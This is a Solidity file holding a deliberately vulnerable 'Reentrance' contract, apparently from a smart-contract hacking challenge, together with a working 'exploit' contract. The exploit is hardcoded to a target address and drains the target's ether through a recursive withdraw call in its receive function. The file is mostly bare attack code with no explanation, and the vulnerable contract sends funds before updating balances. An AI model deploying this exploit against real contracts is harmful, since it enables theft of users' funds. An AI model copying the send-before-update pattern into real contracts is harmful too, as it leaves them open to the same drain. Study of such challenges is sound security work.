// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract exploit{
    Reentrance contractt = Reentrance(payable(0x31b4b5aFE73973A21890bE70a651f6B36fFcBe1a));

    function donate() public payable{
        contractt.donate{value : msg.value}(address(this));
        contractt.withdraw(msg.value);
    }
    receive() payable external {
        if(address(contractt).balance > 0){
            contractt.withdraw(2000000000000400);
        }
    }
}